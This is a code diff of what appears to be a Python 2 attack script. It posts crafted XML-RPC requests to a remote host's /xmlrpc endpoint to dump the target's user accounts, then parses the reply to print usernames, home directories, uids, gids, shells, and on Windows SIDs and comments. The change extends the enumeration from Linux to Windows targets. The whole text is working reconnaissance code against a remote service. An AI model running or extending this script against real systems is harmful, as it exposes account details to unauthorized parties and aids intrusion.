@@ -142,48 +142,52 @@ else:
 print "Sending request for users...\n"
 if linux:
     r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getUnixUsers)
+    r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getNext)
 else:
     r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getWindowsUsers)
-
-print r.content
-
-r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getNext)
 
 with open("./users.xml", "w") as text_file:
     text_file.write(r.content)
 
-r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getNext)
-
-r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=closeAsset)
+if linux:
+    r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=getNext)
+    r = s.post('http://'+HOST+':'+str(PORT)+'/xmlrpc', data=closeAsset)
 
 root = ET.parse('./users.xml').getroot()
 count = 0
 ind = 1
 while ind:
     try:
-        ind = root[0][0][0][0][0][1][0][0][count][0][0][1][0][2][1].text
+        ind = root[0][0][0][0][0][1][0][0][count][0][0][1][0][2][1].text \
+                if linux \
+                else root[0][0][0][0][0][count][0][14][1].text
     except IndexError:
         pass
         break
     count += 1
 
 print "Number of users found: " + str(count) + "\n"
-
 for i in range(0, count):
-    print "User " + str(i) + ": " + root[0][0][0][0][0][1][0][0][i][0][0][1][0][2][1].text + "\n........................"
-    print "home directory:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][0][0][1][1][0][1][1].text
-    print "uid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][11][0][1][1][0][1][1][0].text
-    print "gid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][3][0][1][1][0][1][1][0].text
-    print "primaryGroupName:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][4][0][1][1][0][1][1].text
-    try:
-        print "username:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][2][0][1][1][0][1][1].text
-        print root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0]
-    except IndexError:
-        pass
-    try:
-        print "shell:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][10][0][1][1][0][1][1].text
-    except IndexError:
-        pass
+    if linux is True:
+        print "User " + str(i) + ": " + root[0][0][0][0][0][1][0][0][i][0][0][1][0][2][1].text + "\n........................"
+        print "home directory:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][0][0][1][1][0][1][1].text
+        print "uid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][11][0][1][1][0][1][1][0].text
+        print "gid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][3][0][1][1][0][1][1][0].text
+        print "primaryGroupName:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][4][0][1][1][0][1][1].text
+        try:
+            print "username:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][2][0][1][1][0][1][1].text
+            print root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0]
+        except IndexError:
+            pass
+        try:
+            print "shell:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][10][0][1][1][0][1][1].text
+        except IndexError:
+            pass
+    else:
+        print "Username: "+ root[0][0][0][0][0][i][0][14][1].text
+        print "SID: "     + root[0][0][0][0][0][i][0][12][1].text
+        print "Comment: " + root[0][0][0][0][0][i][0][2][1].text
+        
     print "........................\n"
 
 
